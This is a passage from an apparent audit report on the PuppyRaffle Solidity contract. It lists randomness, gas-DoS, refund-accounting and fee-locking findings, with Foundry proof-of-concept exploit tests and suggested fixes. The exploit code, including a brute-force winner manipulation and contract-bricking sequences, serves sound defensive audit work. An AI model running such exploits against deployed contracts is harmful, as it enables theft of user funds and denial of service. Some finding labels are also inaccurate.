uint256 rarity = uint256(
    keccak256(abi.encodePacked(msg.sender, block.difficulty))
) % 100;
```

## Impact
Because the raffle winner and NFT rarity are derived from `keccak256(msg.sender, block.timestamp, block.difficulty)`, any party that can control or accurately predict those inputs can bias the result. A block proposer (miner / validator) or anyone using a bundle/flash-bot that is executed at the end of a block can:
• Pick a `msg.sender` (deploy a throw-away contract) and the exact `block.timestamp` / `block.difficulty` they want, compute off-chain whether they will win, and only send the transaction when it makes them the winner.
• Re-submit the transaction with a different `msg.sender` or cancel it if the off-chain simulation shows they will lose.
Consequently the raffle can be completely rigged, letting the attacker steal 80 % of the prize pool and always mint the highest–rarity NFT. Loss of fairness and theft of user funds make this a high-severity issue, independent of the post-Merge semantic change of `block.difficulty`.

## Proof of Concept
Off-chain search (pseudo-code)
```
playersLen = 4;                  // after 4 players have entered
for addr in generateAddresses(): // attacker can create unlimited EOAs/contracts
    for diff in range(0, 2**16): // difficulty that the attacker can set via a private bundle
        idx = keccak256(addr, now+2, diff) % playersLen
        if idx == attackerIndex:  // attacker wants to be the winner
            submitBundle(addr, diff)  // include a tx that sets timestamp & difficulty
            return  // attacker wins and receives 80 % of the pool
```

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;

    address p1 = address(0x1);
    address p2 = address(0x2);
    address p3 = address(0x3);

    function setUp() public {
        vm.deal(p1, 10 ether);
        vm.deal(p2, 10 ether);
        vm.deal(p3, 10 ether);
        vm.deal(address(this), 10 ether);

        raffle = new PuppyRaffle(ENTRANCE, address(this), 1); // short raffle duration

        _enter(p1);
        _enter(p2);
        _enter(p3);
        _enter(address(this)); // attacker is last player (index 3)

        // wait until raffle is over
        vm.warp(block.timestamp + 2);
    }

    function test_AttackerCanForceWin() public {
        // players.length is 4, attacker index is 3
        uint256 targetIndex = 3;
        uint256 playersLen   = 4;

        // brute-force a difficulty value that makes attacker win
        for (uint256 d = 0; d < 1000; ++d) {
            uint256 idx = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, d))) % playersLen;
            if (idx == targetIndex) {
                vm.difficulty(d); // cheat-code available in Foundry
                break;
            }
        }

        raffle.selectWinner();
        assertEq(raffle.previousWinner(), address(this), "attacker did not win – randomness is manipulable");
    }

    function _enter(address player) internal {
        address[] memory arr = new address[](1);
        arr[0] = player;
        vm.prank(player);
        raffle.enterRaffle{value: ENTRANCE}(arr);
    }
}

## Suggested Mitigation
Replace the current pseudo-random logic with an un-biasable source such as Chainlink VRF, DRAND, or a commit-reveal scheme. Example (Chainlink):
1. Upgrade contract to Solidity ≥0.8.7 and inherit `VRFConsumerBaseV2`.
2. Call `requestRandomWords()` when raffle ends instead of computing the winner immediately.
3. In `fulfillRandomWords`, derive `winnerIndex` and `rarity` from the VRF output and complete the payout/mint.
This eliminates miner / validator influence and guarantees unpredictability.

## [H-10]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function has a nested loop that checks for duplicate players, which can lead to a denial-of-service attack when the number of players becomes large. As the array of players grows, the gas cost for checking duplicates grows quadratically (O(n²)), eventually making it impossible to enter the raffle due to exceeding the block gas limit.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... other code ...
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ... other code ...
}
```

## Impact
As the number of players increases, the gas cost for entering the raffle will grow quadratically. Eventually, transactions will exceed the block gas limit, making it impossible for new players to enter the raffle. This effectively breaks the core functionality of the contract and could result in the raffle becoming unusable or requiring a redeployment.

## Proof of Concept
The attack is purely gas–exhaustion. A single transaction that inserts a large batch of addresses will iterate players.length² / 2 times inside the duplicate-check loop, quickly exceeding the block gas limit and reverting.

1. Assume entranceFee = 1 wei.
2. Attacker crafts an array with 1 500 unique addresses and calls enterRaffle with msg.value = 1 500 wei.
3. The contract performs ~1 125 000 duplicate comparisons (1 500×1 499/2). Even at an optimistic 20 gas per comparison this is >22 M gas, above the 30 M block gas limit once calldata & other costs are included, so the transaction always runs out of gas.
4. After any such failed call no-one can enter the raffle until someone triggers selectWinner and resets the array, effectively giving the attacker a repeatable DoS lever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 wei;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xBEEF), 1 days);
    }

    function test_duplicateCheckGasDos() public {
        uint256 playerCount = 1_500; // enough to exceed gas limit
        address[] memory batch = new address[](playerCount);
        for (uint256 i; i < playerCount; ++i) {
            batch[i] = address(uint160(i + 1));
        }

        // Fund the caller so it can pay the entrance fee
        vm.deal(address(this), playerCount * FEE);

        // Use a low-level call with a bounded gas stipend so the test is deterministic
        (bool success, ) = address(raffle).call{value: playerCount * FEE, gas: 5_000_000}(
            abi.encodeWithSelector(raffle.enterRaffle.selector, batch)
        );
        assertTrue(!success, "Call should run out of gas and revert");
    }
}

## Suggested Mitigation
Track participation with a permanent mapping so duplicate checks are O(1).

```solidity
mapping(address => bool) private isPlayer;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "Wrong fee");

    for (uint256 i; i < newPlayers.length; ++i) {
        address p = newPlayers[i];
        require(!isPlayer[p], "Duplicate player");
        isPlayer[p] = true;
        players.push(p);
    }

    emit RaffleEnter(newPlayers);
}

function refund(uint256 index) external {
    address p = players[index];
    require(p == msg.sender, "Not player");
    require(p != address(0), "Already refunded");
    isPlayer[p] = false;
    // ... rest unchanged
}

function selectWinner() external {
    // ... after determining the winner
    for (uint256 i; i < players.length; ++i) {
        isPlayer[players[i]] = false; // reset mapping
    }
    delete players;
    // ... rest unchanged
}
```
This removes the O(n²) loop entirely, preventing gas-exhaustion while preserving duplicate protection.

## [H-11]. Unexpected Eth issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract contains a critical vulnerability where it sets the player's address to address(0) without adjusting the array length. This creates an array with gaps, leading to potential funds being permanently locked in the contract.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Impact
When a player requests a refund, their address is set to address(0) but remains in the players array. This leads to two significant issues:
1. The funds corresponding to that entry remain locked in the contract because the total prize pool calculation still includes the refunded player (players.length * entranceFee).
2. If a player address is set to address(0) and another person attempts to enter the raffle with address(0), the duplicate check will incorrectly identify it as a duplicate, preventing entry.

Over time, as more refunds are processed, an increasing amount of ETH will become permanently locked in the contract.

## Proof of Concept
1. A raffle begins with 10 players, each depositing 1 ETH
2. 5 players request refunds, receiving their 1 ETH back
3. The players array still has 10 elements, but 5 of them are address(0)
4. When selectWinner is called, totalAmountCollected is calculated as 10 * 1 ETH = 10 ETH
5. However, only 5 ETH remains in the contract (the other 5 ETH was refunded)
6. The prize pool calculation attempts to distribute 8 ETH (80% of 10 ETH)
7. The transaction will revert due to insufficient contract balance, locking all remaining funds

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundVulnerabilityTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;

    address payer = address(100);
    address[] players;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, payable(address(1)), 1 days);

        // prepare 10 distinct player addresses
        players = new address[](10);
        for (uint256 i; i < 10; ++i) {
            players[i] = address(uint160(i + 1));
            // give each player a little ether to pay for gas when calling refund
            vm.deal(players[i], 0.1 ether);
        }

        // fund the single payer with enough ether to pay the whole 10-ETH entrance amount
        vm.deal(payer, 20 ether);

        // payer enters the raffle on behalf of the 10 addresses
        vm.prank(payer);
        raffle.enterRaffle{value: ENTRANCE_FEE * 10}(players);
    }

    function test_refundCreatesLockedFunds() public {
        // first five players claim a refund
        for (uint256 i; i < 5; ++i) {
            vm.prank(players[i]);
            raffle.refund(i);
        }

        // only half of the ETH should remain inside the contract
        assertEq(address(raffle).balance, ENTRANCE_FEE * 5);

        // fast-forward so that raffle period is over
        vm.warp(block.timestamp + 1 days);

        // selecting the winner must revert because the contract
        // tries to pay 8 ETH while holding only 5 ETH
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Implement a proper array removal technique that maintains array integrity. Instead of setting an address to address(0), remove the element from the array by shifting elements:

```solidity
function refund(uint256 playerIndex) public {
    require(playerIndex < players.length, "PuppyRaffle: Index out of bounds");
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Remove player by shifting elements
    for (uint256 i = playerIndex; i < players.length - 1; i++) {
        players[i] = players[i + 1];
    }
    players.pop(); // Remove the last element and reduce array length
    
    emit RaffleRefunded(playerAddress);
}
```

This ensures that the players array always accurately reflects the actual number of participants, preventing any ETH from being locked in the contract.

## [H-12]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows players to get their entry fee back, but it sets their address to `address(0)` without reducing the `players.length`. This creates an issue in the `selectWinner` function when calculating the prize pool, as it still counts refunded players in the total amount collected.

Vulnerable code snippet:
```solidity
function refund(uint256 playerIndex) public {
    // ... other code ...
    players[playerIndex] = address(0);
    // ... other code ...
}

function selectWinner() external {
    // ... other code ...
    uint256 totalAmountCollected = players.length * entranceFee;
    // ... other code ...
}
```

## Impact
Because refunded players are still counted in `players.length`, `selectWinner()` over-estimates `totalAmountCollected` and tries to transfer more ether than the contract owns. The low-level `winner.call{value: prizePool}` therefore reverts and the whole transaction is rolled back. After the first refund the raffle becomes impossible to finish – anyone can brick the raffle permanently, locking all ether (including the owner’s fees) and preventing every honest player from ever receiving a prize or a refund. This is a permanent denial-of-service and loss-of-funds scenario.

## Proof of Concept
1. Two players A and B enter the raffle paying 1 ether each (entranceFee = 1 ether).
2. Player B calls `refund(1)`. Contract balance is now 1 ether but `players.length` is still 2.
3. Wait until the raffle duration has passed.
4. Any address calls `selectWinner()`.  `totalAmountCollected` is computed as 2 * 1 ether = 2 ether, so `prizePool = 1.6 ether`.
5. Contract balance (1 ether) is lower than `prizePool`, therefore `winner.call{value:1.6 ether}` fails and the `require(success)` reverts.
6. The revert keeps all state unchanged, so every subsequent attempt to finalise the raffle will keep failing – the contract is bricked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundDosTest is Test {
    PuppyRaffle raffle;
    address p1 = address(1);
    address p2 = address(2);

    function setUp() public {
        vm.deal(p1, 2 ether);
        vm.deal(p2, 2 ether);

        raffle = new PuppyRaffle(1 ether, address(100), 1); // 1-second raffle duration

        // players enter
        address[] memory list = new address[](2);
        list[0] = p1;
        list[1] = p2;
        vm.prank(p1);
        raffle.enterRaffle{value: 2 ether}(list);

        // p2 refunds
        vm.prank(p2);
        raffle.refund(1);
    }

    function test_selectWinnerRevertsAfterRefund() public {
        // advance time so the raffle can be closed
        vm.warp(block.timestamp + 2);
        vm.prank(p1);
        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Maintain an `activePlayerCount` variable that is incremented on every successful entry and decremented on every refund, or shrink the array by replacing the refunded slot with the last element and calling `players.pop()`. Always compute `totalAmountCollected = activePlayerCount * entranceFee`. In addition, update `withdrawFees()` to rely on `activePlayerCount == 0` instead of comparing balances so that fee withdrawal is not blocked by the same accounting issue.



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop for checking duplicate players that can lead to excessive gas consumption. This O(n²) operation becomes increasingly expensive as the number of players grows, potentially causing transactions to hit the block gas limit and making the function unusable.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... other code
    for (uint256 i_scope_0 = 0; i_scope_0 < players.length - 1; i_scope_0++) {
        for (uint256 j = i_scope_0 + 1; j < players.length; j++) {
            require(players[i_scope_0] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ... other code
}
```

## Impact
As the number of players increases, the function will consume exponentially more gas. This will eventually make the function hit the block gas limit, preventing new players from entering. Attackers could intentionally add many addresses to make the raffle unusable for legitimate users, effectively denying service.

## Proof of Concept
1. An attacker enters the raffle with a small number of addresses (e.g., 10-20)
2. This makes the duplicate check consume a reasonable amount of gas
3. The attacker continues to add more addresses in separate transactions
4. Eventually, the cost of the duplicate check grows quadratically
5. After enough addresses are added (approximately 750-1000 depending on gas limit), the function becomes impossible to execute as it will exceed the block gas limit
6. New legitimate users cannot enter the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    uint256 duration = 1 days;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testGasGrief() public {
        // First, let's add 100 players
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 1));
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
        uint256 gasUsed = gasStart - gasleft();
        console.log("Gas used for 100 players: %d", gasUsed);

        // Now, let's add 200 more players
        address[] memory morePlayers = new address[](200);
        for (uint256 i = 0; i < 200; i++) {
            morePlayers[i] = address(uint160(i + 101));
        }
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 200}(morePlayers);
        gasUsed = gasStart - gasleft();
        console.log("Gas used for 200 more players (total 300): %d", gasUsed);
        
        // At this point, gas usage should be much higher per player
        // If we keep adding players, eventually we'll hit the block gas limit
    }
}

## Suggested Mitigation
Replace the O(n²) duplicate checking algorithm with a more efficient approach using a mapping to track addresses:

```solidity
// Add a mapping to track if an address is already a player
mapping(address => bool) public isPlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // For each new player
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!isPlayer[player], "PuppyRaffle: Duplicate player");
        
        // Mark this address as a player
        isPlayer[player] = true;
        players.push(player);
    }
    
    emit RaffleEnter(newPlayers);
}

// Update refund function to clear the isPlayer flag
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Clear the player flag
    isPlayer[playerAddress] = false;
    
    // Continue with refund logic
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

// Don't forget to clear all flags in selectWinner
function selectWinner() external {
    // ... existing code
    
    // Clear player flags
    for (uint256 i = 0; i < players.length; i++) {
        isPlayer[players[i]] = false;
    }
    
    delete players;
    // ... rest of function
}
```

## [M-2]. Timestamp Dependent Logic issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function does not check if the contract is currently accepting entries or if the raffle's duration has already ended. This means players can continue to enter a raffle even after the time when a winner could be selected, potentially leading to unfair scenarios.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // Check entrance fee paid
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    
    // Add players to the raffle
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    
    // Check for duplicates
    // ...
}
```

There is no check against `raffleStartTime + raffleDuration` to ensure the raffle is still open for entries.

## Impact
Because enterRaffle is missing a time-gate, anyone can still be added to the players array after the advertised raffle period has elapsed but before selectWinner is called. An attacker can wait until exactly three players have joined, evaluate the pot size, and then become the fourth player in the very same block, immediately calling selectWinner afterwards. This grants a 25 % chance to win 80 % of the pot while contributing only 20 % of it, giving the adversary a favourable risk-reward profile and undermining raffle fairness.

## Proof of Concept
1. Honest users A, B and C enter the raffle.
2. Time passes and raffleDuration elapses.
3. Nobody has yet called selectWinner(), so the raffle is technically over but still OPEN in the contract.
4. Attacker D, after observing there are only three players, calls enterRaffle() with his address and, in the same transaction or the very next one, calls selectWinner().
5. D now owns 25 % of the winning probability while bearing only 20 % of the cost, giving him a positive expected value and violating the advertised rules that the raffle closes after raffleDuration.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract LateEntryTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address feeAddr = address(0xfee);
    address p1 = address(0x1);
    address p2 = address(0x2);
    address attacker = address(0xA);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddr, DURATION);
        deal(p1, ENTRANCE_FEE);
        deal(p2, ENTRANCE_FEE);
        deal(attacker, ENTRANCE_FEE);

        address[] memory arr = new address[](1);
        arr[0] = p1;
        vm.prank(p1);
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        arr[0] = p2;
        vm.prank(p2);
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
    }

    function test_AttackerCanEnterAfterDeadline() public {
        // Move time forward past the raffle deadline
        vm.warp(block.timestamp + DURATION + 1);

        // Attacker joins although the raffle should be closed
        address[] memory arr = new address[](1);
        arr[0] = attacker;
        vm.prank(attacker);
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        // Verify attacker is inside the players array
        bool found;
        for (uint256 i; i < 3; ++i) {
            if (raffle.players(i) == attacker) found = true;
        }
        assertTrue(found, "Late entrant not recorded");
    }
}

## Suggested Mitigation
Add `require(block.timestamp < raffleStartTime + raffleDuration, "PuppyRaffle: Raffle entry period has ended");` at the top of enterRaffle, or migrate to an enum based state machine (OPEN, CALCULATING_WINNER, CLOSED) where state is flipped to CLOSED once the deadline is reached, preventing any further entries.

## [M-3]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the contract calculates the winner's index using a modulo operation on the keccak256 hash of several parameters. If there are no active players (which shouldn't happen due to the minimum player requirement, but is theoretically possible), this would result in a division by zero error.

```solidity
uint256 winnerIndex = uint256(
    keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))
) % players.length;
```

The function has a check for `players.length >= 4`, but it's missing a check for cases where all players might have been refunded (set to address(0)).

## Impact
If every player has refunded, the array still contains four zero addresses, allowing selectWinner() to pass the `players.length >= 4` gate. When the random index hits a zero entry, the function attempts to `_safeMint` an NFT to address(0) and reverts with "ERC721: mint to the zero address". The whole transaction reverts, so the players array is **never cleared again**. Because the array now already contains multiple identical zero-addresses, any future call to `enterRaffle` will fail the duplicate-player check, and every subsequent `selectWinner` attempt will keep reverting. The raffle becomes permanently unusable (Denial-of-Service) and no new games can be started.

## Proof of Concept
1. Deploy PuppyRaffle with entranceFee = 1 ether, raffleDuration = 1 second.
2. Let addresses A,B,C,D enter raffle supplying 4 ether.
3. Each of them calls refund(); the players array is now `[0x0,0x0,0x0,0x0]`.
4. Wait more than `raffleDuration` and call selectWinner().
5. Tx reverts with `ERC721: mint to the zero address`, proving the protocol is bricked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RaffleDOS is Test {
    PuppyRaffle raffle;
    address A = vm.addr(1);
    address B = vm.addr(2);
    address C = vm.addr(3);
    address D = vm.addr(4);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(10), 1 seconds);
        address[] memory p = new address[](4);
        p[0] = A; p[1] = B; p[2] = C; p[3] = D;
        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(p);
        vm.prank(A); raffle.refund(0);
        vm.prank(B); raffle.refund(1);
        vm.prank(C); raffle.refund(2);
        vm.prank(D); raffle.refund(3);
        vm.warp(block.timestamp + 2); // raffle over
    }

    function test_selectWinnerReverts() public {
        vm.expectRevert("ERC721: mint to the zero address");
        raffle.selectWinner();
    }

    function test_newEntriesImpossible() public {
        address[] memory p = new address[](1);
        p[0] = vm.addr(5);
        vm.deal(address(this), 1 ether);
        vm.expectRevert(); // duplicate zero-addresses cause revert
        raffle.enterRaffle{value: 1 ether}(p);
    }
}

## Suggested Mitigation
Option 1 (minimal): before using `winner`, add `require(winner != address(0), "PuppyRaffle: no active players");`.

Option 2 (cleaner): when a player refunds, remove the element with swap-and-pop so the array only contains active players:

```solidity
function refund(uint256 index) external {
    require(players[index] == msg.sender, "Not player");
    Address.sendValue(payable(msg.sender), entranceFee);
    uint256 last = players.length - 1;
    players[index] = players[last];
    players.pop();
}
```

Either approach guarantees `winner` is a non-zero address and avoids duplicate zero-entries, fully eliminating the DOS vector.

## [M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function checks that the contract's balance exactly matches the `totalFees` value, which means it can't be called if there are active players. This becomes problematic if users enter the raffle but the minimum 4-player threshold is never reached, or if the contract never calls `selectWinner()` for any reason. In such scenarios, the fees would be locked in the contract permanently.

Vulnerable code snippet:
```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
If the raffle fails to complete for any reason (not enough players join, contract bug, etc.), the fees from previous rounds could become permanently locked in the contract. This could lead to loss of funds for the protocol owner, especially if this happens after several successful raffle rounds where fees have accumulated.

## Proof of Concept
1. The raffle runs successfully for several rounds, accumulating fees
2. A new round starts but fails to attract 4 players
3. The contract balance now includes both the fees and the entry payments from the current incomplete round
4. The `withdrawFees` function cannot be called because `address(this).balance != totalFees`
5. If the raffle never reaches 4 players, the fees remain locked forever

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6 <0.9.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract LockedFeesTest is Test {
    PuppyRaffle private raffle;
    address private constant OWNER = address(1);
    address private constant FEE_ADDR = address(10);

    function setUp() public {
        vm.prank(OWNER);
        raffle = new PuppyRaffle(1 ether, FEE_ADDR, 1 days);
        vm.deal(address(this), 10 ether); // fund test contract
    }

    function testLockedFees() public {
        // --- Round 1 (successful) --- //
        address[] memory round1 = new address[](4);
        for (uint256 i; i < 4; i++) {
            round1[i] = address(uint160(100 + i));
        }
        raffle.enterRaffle{value: 4 ether}(round1);
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
        uint256 feesBefore = raffle.totalFees();
        assertGt(feesBefore, 0);

        // --- Round 2 (stuck <4 players) --- //
        address[] memory round2 = new address[](2);
        round2[0] = address(200);
        round2[1] = address(201);
        raffle.enterRaffle{value: 2 ether}(round2);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Modify the `withdrawFees` function to allow withdrawing accumulated fees even when there are active players. Use a separate accounting system instead of relying on the contract balance:

```solidity
function withdrawFees() external {
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    require(
        address(this).balance >= feesToWithdraw,
        "PuppyRaffle: Insufficient balance"
    );
    
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Alternatively, add an emergency function that allows the owner to complete or cancel a raffle that has been stuck for too long:



# Low Risk Findings

## [L-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma statement `pragma solidity ^0.7.6` which allows compilation with any compiler version greater than or equal to 0.7.6 but less than 0.8.0. This can lead to inconsistent behavior or introduce bugs if the contract is compiled with different compiler versions.

```solidity
// At the beginning of the contract
pragma solidity ^0.7.6;
```

## Impact
Using a floating pragma can lead to different bytecode being deployed depending on the compiler version used. This can introduce subtle bugs, compatibility issues, or vulnerabilities if a newer compiler version introduces changes or if an older version with known bugs is used. It also makes it harder for auditors and developers to reproduce and verify the exact bytecode deployed on the blockchain.

## Proof of Concept
1. Developer A compiles the contract with Solidity 0.7.6 and deploys it
2. Developer B makes a small change and compiles with Solidity 0.7.9
3. The resulting bytecode may behave differently due to compiler optimizations or bug fixes
4. This can lead to unexpected behavior or inconsistencies between deployments
5. If a critical security bug is fixed in a newer compiler version but not used, the contract remains vulnerable

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

contract PragmaTest is Test {
    function testPragmaIssue() public {
        // This is a conceptual test as we can't easily demonstrate
        // compiler version issues in a unit test.
        
        // Instead, we can check the actual compiler version used
        uint256 compilerVersion = type(PragmaTest).creationCode.length > 0 ? 1 : 0;
        
        // Simplified demonstration - in reality you'd need to compile the same
        // contract with different compiler versions and compare bytecode
        console.log("Contract compiled with Solidity version that supports creation code:", compilerVersion == 1);
        
        // In practice, differences would be in generated bytecode
        // and behavior based on compiler versions
    }
}

// For a real test, you would need to compile the contract with different
// compiler versions and compare the bytecode or behavior, which can't
// be done in a single test file.

## Suggested Mitigation
Use a fixed pragma statement that specifies the exact compiler version to be used. This ensures that the contract is always compiled with the same compiler version, leading to consistent bytecode and behavior.

```solidity
// Replace the floating pragma with a fixed version
pragma solidity 0.7.6;
```

This change ensures that the contract is always compiled with Solidity 0.7.6, regardless of which development environment or tools are used. Additionally, consider upgrading to a more recent Solidity version (like 0.8.x) that includes important safety features such as built-in overflow checks, but only after thorough testing and potentially adjusting the code for compatibility.

## [L-2]. Gas Grief BlockLimit issue in PuppyRaffle::_isActivePlayer

## Description
The `_isActivePlayer` function checks if a player is active by iterating through the entire players array. This can be very gas-inefficient with a large number of players and can lead to transactions running out of gas.

```solidity
function _isActivePlayer() internal view returns (bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == msg.sender) {
            return true;
        }
    }
    return false;
}
```

Although this function is internal and currently unused in the contract, it represents poor design that could cause issues if later utilized.

## Impact
At present the contract is not affected because _isActivePlayer() is never invoked. However, if future code starts to call the helper in a state-changing path (e.g. inside refund, withdrawFees, or a new pause modifier), any user could bloat the players array with thousands of addresses and make those functions run out of gas. This would lead to a denial-of-service for legitimate users and freeze functionality that depends on the check.

## Proof of Concept
1. Deploy the contract with an extremely small entranceFee.
2. Attacker calls enterRaffle with 5,000 distinct addresses (bot wallets), paying only 5,000 * entranceFee.
3. Suppose a later version of the contract starts using _isActivePlayer() inside a public function F. When any user calls F, the loop will run through the 5,000-element array, consuming roughly 500k–1M gas and likely reverting once the array is even larger.
4. Attacker can repeat step 2 to keep growing the array, permanently blocking F and creating a denial-of-service.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

// helper that exposes the internal function
contract ExposedPuppyRaffle is PuppyRaffle {
    constructor(uint256 fee,address feeAddr,uint256 dur) PuppyRaffle(fee,feeAddr,dur) {}
    function isActivePlayer() external view returns (bool) {
        return _isActivePlayer();
    }
}

contract ActivePlayerGasTest is Test {
    ExposedPuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new ExposedPuppyRaffle(FEE, address(this), 7 days);
    }

    function testGasGrowsLinearly() public {
        address[] memory batch = new address[](100);
        for (uint256 i; i < 100; i++) batch[i] = address(uint160(i+1));
        vm.deal(address(this), FEE * 100);
        raffle.enterRaffle{value: FEE * 100}(batch);

        uint256 gasBefore = gasleft();
        vm.prank(batch[99]);
        raffle.isActivePlayer();
        uint256 gasFor100 = gasBefore - gasleft();

        // add another 100 players (total 200)
        batch = new address[](100);
        for (uint256 i; i < 100; i++) batch[i] = address(uint160(i+101));
        vm.deal(address(this), FEE * 100);
        raffle.enterRaffle{value: FEE * 100}(batch);

        gasBefore = gasleft();
        vm.prank(batch[99]);
        raffle.isActivePlayer();
        uint256 gasFor200 = gasBefore - gasleft();

        assertGt(gasFor200, gasFor100, "Lookup must cost more after array growth");
    }
}

## Suggested Mitigation
Keep a mapping(address => bool) activePlayers that is updated inside enterRaffle, refund and selectWinner, and refactor _isActivePlayer() to a constant O(1) lookup: `function _isActivePlayer() internal view returns (bool) { return activePlayers[msg.sender]; }`

## [L-3]. Access Control issue in PuppyRaffle::changeFeeAddress

## Description
The contract does not properly validate the fee address in the constructor or when it's changed in the `changeFeeAddress` function. This could allow setting the fee address to address(0), potentially leading to permanent loss of funds.

```solidity
constructor(
    uint256 _entranceFee,
    address _feeAddress,
    uint256 _raffleDuration
) ERC721("Puppy Raffle", "PR") {
    entranceFee = _entranceFee;
    feeAddress = _feeAddress; // No validation
